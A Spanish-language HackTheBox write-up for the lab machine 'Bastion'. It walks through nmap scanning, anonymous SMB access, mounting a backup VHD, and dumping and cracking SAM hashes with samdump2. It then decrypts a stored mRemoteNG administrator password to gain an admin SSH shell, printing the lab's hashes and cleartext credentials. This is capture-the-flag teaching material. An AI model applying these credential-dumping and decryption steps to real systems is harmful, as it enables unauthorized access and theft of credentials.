---
date: 2023-07-29 12:00:00
layout: post
title: Bastion Writeup
subtitle: Writeup de la máquina Bastion de la plataforma HackTheBox
description: En la maquina Bastion nos aprovecharemos del acceso como usuario anonymo para leer archivos compartidos que no deberian de ser accesibles. Nos encontraremos con archivos VHD los cuales podremos montar en nuestro sistema para tratar de encontrar informacion importante y crackearemos hashes para tener claves de usuarios.
image: /assets/img/machines/Bastion/Bastion.png
optimized_image: /assets/img/machines/Bastion/Bastion.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Windows
  - Easy
  - Crack Hashes
  - Samba
  - Anonymous Access
author: FredBrave
---
# Enumeración
Empezaremos con el escaneo de nmap. Una vez realizado el primer escaneo seguimos con el segundo para encontrar más información sobre los puertos abiertos encontrados en el primer escaneo.

```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.136.29 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 11:02 EDT
Nmap scan report for 10.129.136.29
Host is up (0.28s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

sudo nmap -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV 10.129.136.29 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 11:04 EDT
Nmap scan report for 10.129.136.29
Host is up (0.26s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  �~�_U      Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49669/tcp open  msrpc       Microsoft Windows RPC
49670/tcp open  msrpc       Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m57s, deviation: 1h09m13s, median: 0s
| smb2-time: 
|   date: 2023-07-29T15:05:43
|_  start_date: 2023-07-29T14:43:47
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-29T17:05:46+02:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.51 seconds
```

Entre los puertos abiertos el más interesante es el 445 (Samba), empezaré a tratar de enumerar su contenido con la herramienta smbmap.

```bash
smbmap -H 10.129.136.29 -u 'a'
[+] Guest session       IP: 10.129.136.29:445   Name: 10.129.136.29                                     
[-] Work[!] Unable to remove test directory at \\10.129.136.29\Backups\EVSHYIFCJM, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Tengo acceso anónimo al smb por lo que puedo enumerar contenidos del samba. La carpeta Backup es la única interesante entre estos, tiene permisos de escritura y lectura.

```bash
smbmap -H 10.129.136.29 -u 'a' -r Backups
[+] Guest session       IP: 10.129.136.29:445   Name: 10.129.136.29                                     
[|] Work[!] Unable to remove test directory at \\10.129.136.29\Backups\GWYJFETHVB, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Backups                                                 READ, WRITE
        .\Backups\*
        dr--r--r--                0 Sat Jul 29 11:10:31 2023    .
        dr--r--r--                0 Sat Jul 29 11:10:31 2023    ..
        dr--r--r--                0 Sat Jul 29 11:07:33 2023    EVSHYIFCJM
        dr--r--r--                0 Sat Jul 29 11:10:31 2023    GWYJFETHVB
        fw--w--w--              116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r--                0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r--                0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

Explorando más en el samba me doy cuenta de que hay demasiado contenido porque lo que en lugar de seguir buscando a través de herramientas me montaré el contenido del samba en mi sistema.

```bash
sudo mount -t cifs -o username=guest //10.129.136.29/Backups /mnt/mount/
Password for guest@//10.129.136.29/Backups:

ls -la /mnt/mount
total 9
drwxr-xr-x 2 root root 4096 Jul 29 11:11 .
drwxr-xr-x 3 root root 4096 Jul 29 11:16 ..
drwxr-xr-x 2 root root    0 Jul 29 11:11 AWSPXGITDF
drwxr-xr-x 2 root root    0 Jul 29 11:11 BZRVGDAYFO
drwxr-xr-x 2 root root    0 Jul 29 11:11 EGCYAJGUDH
drwxr-xr-x 2 root root    0 Jul 29 11:07 EVSHYIFCJM
drwxr-xr-x 2 root root    0 Jul 29 11:10 GWYJFETHVB
drwxr-xr-x 2 root root    0 Jul 29 11:10 JRWXFSUHYA
-r-xr-xr-x 1 root root  116 Apr 16  2019 note.txt
-rwxr-xr-x 1 root root    0 Feb 22  2019 SDT65CB.tmp
drwxr-xr-x 2 root root    0 Feb 22  2019 WindowsImageBackup
drwxr-xr-x 2 root root    0 Jul 29 11:11 WJGFGUMBTA
```
Explorando en la carpeta WindowsImageBackup encuentro archivos con una extension interesante. 

```bash
pwd
/mnt/mount/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351

ls -la
total 5330560
drwxr-xr-x 2 root root          0 Feb 22  2019 .
drwxr-xr-x 2 root root          0 Feb 22  2019 ..
-rwxr-xr-x 1 root root   37761024 Feb 22  2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5418299392 Feb 22  2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root       1186 Feb 22  2019 BackupSpecs.xml
-rwxr-xr-x 1 root root       1078 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxr-xr-x 1 root root       8930 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
-rwxr-xr-x 1 root root       6542 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
-rwxr-xr-x 1 root root       2894 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
-rwxr-xr-x 1 root root       1488 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
-rwxr-xr-x 1 root root       1484 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
-rwxr-xr-x 1 root root       3844 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
-rwxr-xr-x 1 root root       3988 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
-rwxr-xr-x 1 root root       7110 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
-rwxr-xr-x 1 root root    2374620 Feb 22  2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```
Buscando en internet me doy cuenta de que un archivo vhd es una imagen virtual de un disco duro, este debería tener contenido interesante.

# Montando Archivo VHD

Al buscar en internet como aprovecharme de este tipo de archivos encuentro el siguiente <a href='https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25'>articulo</a>. Este artículo me explica como montar archivos vhd a través de archivos compartidos remotamente. Lo primero que debemos de hacer es descargarnos dos utilidades.

```bash
apt-get install libguestfs-tools

apt-get install cifs-utils
```
Una vez instalada ambas podemos ejecutar el siguiente comando hacia el archivo vhd.

```bash
sudo guestmount --add '/mnt//mount/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd -v
```

Y habremos montado el archivo vhd en nuestro sistema, ahora explorando en este encuentro que tiene un `Windows File System` este muy probablemente sea el mismo de la máquina.

```bash
ls -la
total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 4 root root       4096 Jul 29 11:36  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```
# Shell como L4mpje

Teniendo esta información podríamos intentar obtener los hashes NTLM de los archivos SYSTEM y SAM en la ruta `Windows/System32/config`. Esto lo haremos con la herramienta samdump2.

```bash
ls
SAM  SYSTEM

samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
Logro crackear el hash de L4mpje usando la página CrackStation.

<img class="img" src="/assets/img/machines/Bastion/2.png" width="1000">

Como vi el ssh abierto intento conectarme a la máquina con este.

```bash
l4mpje@BASTION C:\Users\L4mpje>whoami                                                                                           
bastion\l4mpje
```
# Shell como Administrator

Enumerando el sistema encuentro un programa instalado en la máquina.

```bash
l4mpje@BASTION C:\PROGRA~2>dir                                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 1B7D-E692                                                                                              

 Directory of C:\PROGRA~2                                                                                                       

22-02-2019  15:01    <DIR>          .                                                                                           
22-02-2019  15:01    <DIR>          ..                                                                                          
16-07-2016  15:23    <DIR>          Common Files                                                                                
23-02-2019  10:38    <DIR>          Internet Explorer                                                                           
16-07-2016  15:23    <DIR>          Microsoft.NET                                                                               
22-02-2019  15:01    <DIR>          mRemoteNG                                                                                   
23-02-2019  11:22    <DIR>          Windows Defender                                                                            
23-02-2019  10:38    <DIR>          Windows Mail                                                                                
23-02-2019  11:22    <DIR>          Windows Media Player                                                                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                                                                 
16-07-2016  15:23    <DIR>          Windows NT                                                                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                                                                                                                                                                               
16-07-2016  15:23    <DIR>          WindowsPowerShell                                                                                                                                                                                      
               0 File(s)              0 bytes                                                                                                                                                                                              
              14 Dir(s)   4.822.274.048 bytes free
```
Buscando en internet encuentro lo siguiente sobre el programa mRemoteNG `Es una herramienta para gestionar conexiones remotas con otros sistemas informáticos. Es un gran aliado para los SysAdmins ya que soporta varios tipos de conexiones, como RDP, VNC y SSH`.

Al profundizar más en la búsqueda encuentro que este programa guarda hashes en el directorio Home del usuario y que estos hashes pueden ser crackeados por la siguiente <a href='https://github.com/haseebT/mRemoteNG-Decrypt'>herramienta</a>.

```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                                                                                                                               
 Volume in drive C has no label.                                                                                                                                                                                                           
 Volume Serial Number is 1B7D-E692                                                                                                                                                                                                         
                                                                                                                                                                                                                                           
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                                                                                                                                    
                                                                                                                                                                                                                                           
22-02-2019  15:03    <DIR>          .                                                                                                                                                                                                      
22-02-2019  15:03    <DIR>          ..                                                                                                                                                                                                     
22-02-2019  15:03             6.316 confCons.xml                                                                                                                                                                                           
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                                                                                                                                
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                                                                                                                                
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                                                                                                                                
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                                                                                                                                
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                                                                                                                                
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                                                                                                                                
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                                                                                                                                
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                                                                                                                                
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                                                                                                                                
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                                                                                                                                
22-02-2019  15:03                51 extApps.xml                                                                                                                                                                                            
22-02-2019  15:03             5.217 mRemoteNG.log                                                                                                                                                                                          
22-02-2019  15:03             2.245 pnlLayout.xml                                                                                                                                                                                          
22-02-2019  15:01    <DIR>          Themes                                                                                                                                                                                                 
              14 File(s)         76.577 bytes                                                                                                                                                                                              
               3 Dir(s)   4.822.274.048 bytes free                                                                                                                                                                                         
                                                                                                                                                                                                                                           
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                                                                                                                                 
<?xml version="1.0" encoding="utf-8"?>                                                                                                                                                                                                     
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC                                                                                                           
M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0                                                                                                           
oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                                                                                                                                 
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna                                                                                                           
me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="                                                                                                           
 Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend                                                                                                           
eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo                                                                                                           
ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp                                                                                                           
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R                                                                                                           
edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire                                                                                                           
ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn                                                                                                           
coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa                                                                                                           
ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna                                                                                                           
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="                                                                                                           
false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab                                                                                                           
leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I                                                                                                           
nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"                                                                                                           
 InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe                                                                                                           
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS                                                                                                           
ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa                                                                                                           
lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad                                                                                                           
BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri                                                                                                           
tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false"                                                                                                            
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC                                                                                                           
Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo                                                                                                           
stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false                                                                                                           
" InheritRDGatewayDomain="false" />                                                                                                                                                                                                        
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"                                                                                                           
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam                                                                                                           
e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering                                                                                                           
Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f                                                                                                           
alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh                                                                                                           
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire                                                                                                           
ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey                                                                                                           
s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin                                                                                                           
g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor                                                                                                           
d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""                                                                                                           
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false                                                                                                           
" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon                                                                                                           
tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri                                                                                                           
tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe                                                                                                           
ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe                                                                                                           
directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio                                                                                                           
n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false"                                                                                                            
InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan                                                                                                           
ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA                                                                                                           
pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher                                                                                                           
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor                                                                                                           
s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam                                                                                                           
e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh                                                                                                           
eritRDGatewayDomain="false" />                                                                                                                                                                                                             
</mrng:Connections>                                                                                                                                                                                                                        
```
Tenemos el hash del administrador por lo que lo siguiente es instalar la herramienta.
```bash
git clone https://github.com/haseebT/mRemoteNG-Decrypt.git
Cloning into 'mRemoteNG-Decrypt'...
remote: Enumerating objects: 19, done.
remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19
Receiving objects: 100% (19/19), 14.80 KiB | 2.11 MiB/s, done.
Resolving deltas: 100% (4/4), done.
❯ cd mRemoteNG-Decrypt
❯ python mremoteng_decrypt.py
usage: mremoteng_decrypt.py [-h] [-f FILE | -s STRING] [-p PASSWORD]

Decrypt mRemoteNG passwords.

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  name of file containing mRemoteNG password
  -s STRING, --string STRING
                        base64 string of mRemoteNG password
  -p PASSWORD, --password PASSWORD
                        Custom password
```
Y solo la usamos tal como nos dice.

```bash
python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```
Nos intentamos conectar por ssh.

```bash
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

administrator@BASTION C:\Users\Administrator>whoami                                                                             
bastion\administrator
```
Hemos pwneado la maquina!

